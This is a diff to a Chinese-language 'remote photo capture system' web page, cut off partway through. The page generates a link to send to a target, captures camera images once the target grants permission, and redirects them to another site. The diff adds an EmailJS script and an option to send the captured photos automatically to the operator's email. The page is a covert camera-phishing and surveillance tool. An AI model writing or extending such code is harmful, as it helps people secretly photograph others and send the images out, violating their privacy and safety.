@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>远程拍摄系统</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -26,11 +27,11 @@
         h1 { text-align: center; color: #333; margin-bottom: 25px; font-size: 22px; }
         .form-group { margin-bottom: 18px; }
         label { display: block; margin-bottom: 6px; color: #555; font-weight: 500; font-size: 14px; }
-        input[type="text"] {
+        input, select {
             width: 100%; padding: 12px 14px; border: 2px solid #e0e0e0;
             border-radius: 8px; font-size: 14px; transition: border-color 0.3s;
         }
-        input[type="text"]:focus { outline: none; border-color: #667eea; }
+        input:focus, select:focus { outline: none; border-color: #667eea; }
         .btn {
             width: 100%; padding: 14px; border: none; border-radius: 8px;
             font-size: 16px; cursor: pointer; transition: all 0.3s; margin-bottom: 12px;
@@ -56,8 +57,10 @@
             border-radius: 8px; font-size: 14px; display: none; z-index: 1000;
             white-space: nowrap;
         }
-
-        /* 拍摄界面 */
+        .config-box {
+            background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px;
+            padding: 12px; margin-bottom: 18px; font-size: 13px; color: #856404;
+        }
         .capture-container {
             display: none; text-align: center; color: white;
             width: 100%; max-width: 500px; padding: 20px;
@@ -93,6 +96,13 @@
     <!-- 主界面 -->
     <div class="container" id="mainInterface">
         <h1>📷 远程拍摄系统</h1>
+        
+        <div class="config-box">
+            ⚠️ <strong>首次使用必看：</strong><br>
+            如果要自动把照片发到你的邮箱，请先在下方选择"发送到邮箱"并填写参数。<br>
+            如果只用默认功能（照片存对方手机），保持"仅保存到对方手机"即可。
+        </div>
+
         <div class="form-group">
             <label>输入ID：</label>
             <input type="text" id="myid" placeholder="输入您的ID"/>
@@ -101,22 +111,12 @@
             <label>拍摄后跳转到：</label>
             <input type="text" id="url" value="http://baidu.com"/>
         </div>
-        <button class="btn btn-primary" onclick="generateLink()">生成链接</button>
-        <div class="link-box">
-            <label>将以下链接发给拍摄对象：</label>
-            <a id="kd" style="pointer-events: none;">请先生成链接！</a>
+        <div class="form-group">
+            <label>照片接收方式：</label>
+            <select id="uploadMethod" onchange="toggleConfig()">
+                <option value="local">仅保存到对方手机（默认）</option>
+                <option value="emailjs">自动发送到我的邮箱（EmailJS）</option>
+            </select>
         </div>
-        <button id="copyBtn" class="btn" onclick="copyToClipboard()">复制链接</button>
-    </div>
-
-    <!-- 拍摄界面 -->
-    <div class="capture-container" id="captureInterface">
-        <h2 id="captureTitle">正在加载...</h2>
-        <div class="warning-box" id="wechatTip">
-            ⚠️ 检测到微信浏览器，请按右上角 ⋮ 选择"在浏览器打开"
-        </div>
-        <video id="video" autoplay playsinline muted></video>
-        <canvas id="canvas"></canvas>
-        <img id="previewImg" alt="拍摄结果"/>
-        <div class="status" id="status">请允许摄像头权限以继续</div>
-        <button class="btn-allow" i
+        
+        <div id=
